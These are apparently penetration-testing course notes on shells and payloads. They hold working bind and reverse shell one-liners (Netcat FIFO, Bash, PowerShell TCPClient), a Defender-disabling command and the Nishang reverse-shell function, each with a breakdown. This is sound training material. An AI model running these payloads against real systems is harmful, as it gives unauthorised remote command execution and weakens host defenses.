## Overview

> **Core Concept:** Shells bring us in; Payloads deliver the shells.

In penetration testing and offensive security, gaining a **shell** is often the primary objective post-enumeration. A shell grants interactive command-line access to a target operating system, allowing an attacker to execute system commands, assess local privilege escalation paths, transfer files, establish persistence, and pivot across the network.

## 1. Defining Shells

A **shell** is a text-based user-space interface that allows operators to interact directly with the operating system kernel (e.g., `Bash`, `Zsh`, `cmd.exe`, `PowerShell`).

![[Pasted image 20260812053603.png]]

### Why Target CLI Shells?

- **Low Visibility:** Command-Line Interfaces (CLI) leave a significantly smaller footprint on network bandwidth and are harder to detect compared to Graphical User Interfaces (GUI) like RDP or VNC.
- **Speed & Automation:** Scripting and terminal navigation are exponentially faster than GUI interaction.
- **Full OS Access:** Direct access to file systems, environment variables, and system binaries required for post-exploitation.

### Multi-Perspective Breakdown

|**Context**|**Definition & Functionality**|**Examples**|
|---|---|---|
|**Computing**|Standard user-space text interface for task management and system instruction.|`Bash`, `Zsh`, `cmd`, `PowerShell`|
|**Exploitation & Security**|An interactive command prompt obtained on a host by bypassing security controls or exploiting a system vulnerability.|Remote `cmd.exe` via EternalBlue (`MS17-010`)|
|**Web Infrastructure**|A malicious script uploaded to a web server (via File Upload vulnerabilities, LFI, etc.) that executes OS commands through web requests.|`PHP`, `ASPX`, `JSP` web shells triggered via HTTP/S|

## 2. Understanding Payloads

In cybersecurity and offensive operations, a **payload** refers to the specific piece of code designed to execute on a target machine to perform an action—most commonly, establishing a remote connection back to the attacker.

### Definition Across Domains

![[Pasted image 20260812053216.png]]

## 3. Operational Workflow

```
[ Enumeration ] ──> [ Identify Vulnerability ] ──> [ Craft/Select Payload ] ──> [ Execute & Catch Shell ]
```

1. **Enumeration:** Identify vulnerable services and potential entry points.
2. **Payload Selection:** Choose an appropriate payload based on the target OS, architecture, and network restrictions.
3. **Execution:** Deploy the payload via the exploit vector.
4. **Interactive Access:** Catch the incoming shell (Reverse Shell) or connect to the bound port (Bind Shell) to begin post-exploitation.

---

# Shell Anatomy & Command Interpreters

## Overview

Interacting with a target operating system requires a clear distinction between **Terminal Emulators** and **Command Language Interpreters**. While the terminal emulator serves as the visual GUI application, the interpreter processes text instructions and issues execution commands directly to the OS kernel.

```
+---------------------+        Input Commands        +--------------------------------+
|  Terminal Emulator  |  =========================>  |   Command Language Interpreter |
| (GUI Container)     |  <=========================  | (Bash, PowerShell, Zsh, etc.)  |
+---------------------+        Text Output           +--------------------------------+
```

## 1. Terminal Emulators

A **terminal emulator** is a software application that mimics a standalone hardware terminal, providing a graphical window to interact with the underlying system shell.

### Common Terminal Emulators by OS

|**Terminal Emulator**|**Supported Operating System(s)**|
|---|---|
|**Windows Terminal**|Windows|
|**cmder**|Windows|
|**PuTTY**|Windows|
|**kitty**|Windows, Linux, macOS|
|**Alacritty**|Windows, Linux, macOS|
|**xterm**|Linux|
|**GNOME Terminal**|Linux|
|**MATE Terminal**|Linux|
|**Konsole**|Linux|
|**Terminal**|macOS|
|**iTerm2**|macOS|

> **Note:** The choice of terminal emulator on an attacker machine is entirely a matter of workflow preference. On target systems, operators are limited to whatever native interfaces or terminal software are locally available.

## 2. Command Language Interpreters

A **command language interpreter** acts as a real-time translator, parsing user inputs, executing commands, and returning output.

$$\text{CLI Environment} = \text{Operating System} + \text{Terminal Emulator} + \text{Command Interpreter}$$

- **MITRE ATT&CK Mapping:** Classified under Execution techniques as **Command and Scripting Interpreter** ([T1059](https://attack.mitre.org/techniques/T1059/)).
- **Security Importance:** Identifying the active interpreter on a target host dictates the payload syntax, scripting flags, and execution primitives required during post-exploitation.

## 3. Identifying Active Shells (Linux )

Terminal emulators are decoupled from specific shell interpreters; a single terminal can host multiple interpreter instances (`Bash`, `PowerShell`, `Zsh`).

### Method 1: Identifying Prompt Symbols

- **`$` Prompt:** Indicates standard non-root user prompts in `Bash`, `Ksh`, and POSIX-compliant shells.
- **`#` Prompt:** Indicates root/privileged access in Unix-like environments.
- **`PS >` Prompt:** Indicates a `PowerShell` session.

### Method 2: Process Inspection (`ps`)

Checking running processes under the current terminal device (`TTY`):

```bash
enamto@htb[/htb]$ ps

    PID TTY          TIME CMD
   4232 pts/1    00:00:00 bash
  11435 pts/1    00:00:00 ps
```

### Method 3: Environment Variable Check (`env`)

Inspecting defined user variables for default shell binaries:

```bash
enamto@htb[/htb]$ env | grep SHELL

SHELL=/bin/bash
```

## 4. Cross-Platform Comparison: Bash vs. PowerShell

|**Feature**|**Bash**|**PowerShell**|
|---|---|---|
|**Primary OS Environment**|Linux / Unix|Windows (Cross-platform via PowerShell Core)|
|**Data Output Type**|Unstructured Text Streams|Structured .NET Objects|
|**Default Prompt**|`$` (User) / `#` (Root)|`PS C:\>`|
|**Primary Use Cases**|Linux administration, Bash scripting, core utility piping|Windows administration, Active Directory management, automation|

---

# Bind Shells Foundations

## Overview

A **Bind Shell** occurs when a listener is executed on the target (victim) machine, bound to a specific port, waiting for an incoming connection from the attacker's system. Once the attacker connects to that open port, access to the target's operating system interface (shell) is granted.

![[Pasted image 20260812060000.png]]

## 1. Operational Challenges & Security Drawbacks

Bind Shells face strict real-world defensive barriers because they rely on **inbound traffic** into the victim's network.

- **Requires Existing Listener:** A port-listening process must already be executing on the target.
- **Inbound Firewall Rules:** Network Firewalls and NAT/PAT at the perimeter heavily drop unsolicited inbound connections on non-standard ports.
- **Host-Based Firewalls (OS Level):** Windows Defender Firewall and Linux `iptables`/`ufw` typically block incoming port bindings.
- **Easier to Detect & Prevent:** Security appliances (IDS/IPS) and perimeter controls easily spot unexpected inbound listening sockets.

## 2. Fundamentals: Netcat (`nc`) as Client/Server

Netcat (the "Swiss Army Knife" of networking) operates across TCP/UDP and Unix sockets. Before spawning a shell, Netcat can establish a raw two-way TCP pipe between a client and a server.

### Step-by-Step Raw TCP Connection Demonstration

#### Server (Target Host)

Starts a listener on port `7777`:

```bash
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
```

- `-l` : Listen mode
- `-v` : Verbose output
- `-n` : Skip DNS resolution (numeric IPs only)
- `-p` : Local port number

#### Client (Attacker Box)

Connects directly to the Target IP on port `7777`:

```bash
enamto@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

> **Note:** Raw Netcat connections only pass text back and forth across the TCP pipe. To execute commands, a command interpreter (like `/bin/bash` or `cmd.exe`) must be explicitly redirected into the pipe.

## 3. Creating a Real Netcat Bind Shell

To turn a raw connection into an interactive system shell on Linux, named pipes (`fifos`) are used to redirect stdin, stdout, and stderr.

### Target Payload Execution (Server Side)

```bash
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

#### Payload Breakdown

1. `rm -f /tmp/f; mkfifo /tmp/f` — Removes any existing FIFO pipe named `/tmp/f` and creates a new named pipe.
2. `cat /tmp/f |` — Reads input from the named pipe and pipes it into Bash.
3. `/bin/bash -i 2>&1 |` — Executes an interactive Bash shell (`-i`) and redirects standard error (`2`) into standard output (`1`).
4. `nc -l 10.129.41.200 7777` — Starts Netcat listening on port `7777`.
5. `> /tmp/f` — Sends the output of Netcat back into the named pipe `/tmp/f`, completing the execution loop.

### Attacker Connection (Client Side)

```bash
enamto@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Target@server:~$ 
```

The attacker now has direct command-line access to the target host.

## 4. Bind Shell vs. Reverse Shell Quick Reference

|**Feature**|**Bind Shell**|**Reverse Shell**|
|---|---|---|
|**Listener Location**|Target / Victim Machine|Attacker Machine|
|**Connection Direction**|Inbound (Attacker $\rightarrow$ Target)|Outbound (Target $\rightarrow$ Attacker)|
|**Firewall Bypass**|Poor (Blocked by inbound rules)|Stronger (Egress traffic is often allowed)|
|**Use Case**|Internal network targets without strict inbound filtering|Targets behind NAT, routers, or strict perimeter firewalls|

---

# Reverse Shells Foundations & Windows Practice

## Overview

A [**Reverse Shell**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is an offensive connection mechanism where the attacker initiates a passive listener on their machine, and the target (victim) executes a payload that initiates an **outbound connection** back to the attacker.

![[Pasted image 20260812063436.png]]

## 1. Why Reverse Shells Over Bind Shells?

In real-world red teaming and penetration testing, reverse shells are far more successful than bind shells due to modern network architecture and defensive controls:

- **Egress Traffic Over Inbound Traffic:** Corporate firewalls and edge routers strictly block incoming connections (Inbound Filtering), but frequently permit outbound network traffic (Egress Traffic) on common web ports.
- **Bypassing NAT & Perimeter Security:** Targets behind Network Address Translation (NAT) or stateful perimeter firewalls can still initiate outbound sockets directly to an attacker's public IP address.
- **Strategic Port Binding:** Binding listeners to [common outbound ports ](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports)like `443` (HTTPS) or `80` (HTTP) minimizes suspicion, as these ports are rarely restricted for outbound employee traffic.

> **Defensive Edge:** Advanced Next-Generation Firewalls (NGFWs) equipped with **Deep Packet Inspection (DPI)** or Layer 7 monitoring can still detect unencrypted reverse shell traffic crossing port 443 by analyzing the packet payload structure rather than just the port number.

## 2. Living Off the Land (LotL) Concept

Relying on external binaries (such as transferring `nc.exe` to a Windows victim) increases detection risk and may fail if file transfer capabilities are limited.

**Living Off the Land (LotL)** involves utilizing built-in operating system binaries and native scripting interpreters (e.g., `PowerShell`, `cmd.exe`, `Bash`, `python`) to deliver payloads and establish remote sessions without dropping external tools to disk.

## 3. Practical Exercise: Windows PowerShell Reverse Shell

### Step 1: Set Up the Attacker Listener (Server)

Bind Netcat to a privileged, highly trusted egress port (`443`):

```bash
enamto@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

### Step 2: Native PowerShell One-Liner Payload

Execute the following one-liner on the target Windows system via Command Prompt or an exploitation vector:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Payload Parameter Breakdown

|**Parameter / Code**|**Function**|
|---|---|
|`powershell -nop -c`|Launches PowerShell without loading user profiles (`-nop`) and executes the command string (`-c`).|
|`New-Object System.Net.Sockets.TCPClient`|Instantiates a raw TCP client socket connecting back to the specified IP and port.|
|`iex $data`|`Invoke-Expression`: Evaluates and executes received command strings dynamically in memory.|
|`2>&1|Out-String`|

## 4. Antivirus & AMSI Considerations

Executing raw un-obfuscated PowerShell reverse shell payloads on modern Windows hosts will trigger **Antimalware Scan Interface (AMSI)** or **Windows Defender Antivirus**.

### Observed Defensive Catch

```powershell
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

### Lab Override (Disabling Real-Time Protection)

In controlled lab environments, real-time monitoring can be toggled off via an administrative PowerShell prompt:

```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

---

# Introduction to Payloads & One-Liner Dissection

## Overview

In general computing, a **payload** represents the intended transmitted message or functional data. In offensive security, a **payload** refers to the specific code or command set delivered to a target system to exploit a vulnerability, execute malicious actions, or establish interactive access (such as a reverse or bind shell).

To bypass security controls and anticipate AV/EDR flags, penetration testers must deconstruct and understand how payload syntax operates under the hood.

## 1. Dissecting the Linux Netcat/Bash Reverse Shell

A standard POSIX-compliant one-liner used to bind an interactive Bash shell to a remote TCP listener using a named pipe (`FIFO`):

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

```
+-----------------------------------------------------------------------------------+
|                                Linux Target Host                                  |
|                                                                                   |
|  /tmp/f (FIFO)  ──>  cat  ──>  /bin/bash -i (2>&1)  ──>  nc  ──> [ /tmp/f Pipe ]  |
+---------------------------------------------------------|-------------------------+
                                                          | Network Socket (TCP)
                                                          v
                                               Attacker Listener (7777)
```

### Technical Breakdown

|**Command Component**|**Function & Mechanism**|
|---|---|
|`rm -f /tmp/f;`|Forces removal (`-f`) of any existing pipe file at `/tmp/f` to prevent execution collisions. The semicolon `;` sequences the next command.|
|`mkfifo /tmp/f;`|Creates a First-In, First-Out (**FIFO**) named pipe file at `/tmp/f` to manage input/output streams.|
|`cat /tmp/f \|`|Reads data written into `/tmp/f` and pipes (`\|`) standard output to the input of the next command.|
|`/bin/bash -i 2>&1 \|`|Launches an interactive Bash shell (`-i`). Redirects standard error (`2`) into standard output (`1`) so both streams travel through the pipe (`\|`).|
|`nc 10.10.14.12 7777 > /tmp/f`|Initiates a Netcat TCP connection to `10.10.14.12:7777`. Redirects (`>`) output received from the attacker back into `/tmp/f`, closing the execution loop.|

## 2. Dissecting the Windows PowerShell Reverse Shell

A native Windows command line payload that instantiates .NET framework classes directly from memory to establish a raw socket connection back to an attacker.

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Technical Breakdown

```
[ CMD / Remote Exec ]
        │
        ▼
[ powershell.exe -nop -c ]
        │
        ├─► System.Net.Sockets.TCPClient  ──> Connects to Attacker IP:Port
        │
        ├─► System.Text.ASCIIEncoding     ──> Encodes bytes <─► ASCII strings
        │
        ├─► Invoke-Expression (iex)      ──> Executes received commands in memory
        │
        └─► Stream Write & Flush         ──> Sends output & prompt (PS C:\> ) back
```

|**Parameter / Snippet**|**Detailed Technical Function**|
|---|---|
|`powershell -nop -c`|Spawns `powershell.exe` ignoring local user profiles (`-nop`) and executing the string payload (`-c`).|
|`$client = New-Object System.Net.Sockets.TCPClient(...)`|Creates a .NET `TCPClient` object that connects directly to the attacker socket (`10.10.14.158:443`).|
|`$stream = $client.GetStream();`|Obtains the network stream interface from the active TCP socket for I/O operations.|
|`[byte[]]$bytes = 0..65535\|%{0};`|Allocates an empty 64KB byte buffer array filled with zeroes.|
|`while(($i = $stream.Read(...)) -ne 0)`|Establishes a continuously listening loop reading incoming bytes from the TCP socket until closed.|
|`$data = (...).GetString($bytes, 0, $i);`|Converts incoming byte streams from the network into ASCII string commands.|
|`$sendback = (iex $data 2>&1 \| Out-String);`|**Critical Component:** Passes raw commands stored in `$data` to `Invoke-Expression` (`iex`) for in-memory execution, capturing `stdout` and `stderr` (`2>&1`).|
|`$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';`|Appends the standard PowerShell prompt string showing the target's current working directory.|
|`$stream.Write(...); $stream.Flush()`|Converts output text back to bytes, transmits it over the wire, and clears the network stream buffer.|
|`$client.Close()`|Gracefully terminates the socket connection when the loop exits.|

## 3. Script-Based Implementation: Nishang (`Invoke-PowerShellTcp`)

Payloads can also be packaged into modular, full-featured PowerShell function scripts (`.ps1`). The **Nishang** framework's `Invoke-PowerShellTcp.ps1` encapsulates both Reverse and Bind shell logic.

### Key Functional Extract


```powershell
function Invoke-PowerShellTcp 
{
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [String]$IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Int]$Port,

        [Switch]$Reverse,
        [Switch]$Bind
    )

    try {
        if ($Reverse) {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }
        if ($Bind) {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        # Send banner & interactive prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
            try {
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            } catch {
                Write-Error $_
            }
            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
    } catch {
        Write-Error $_
    }
}
```
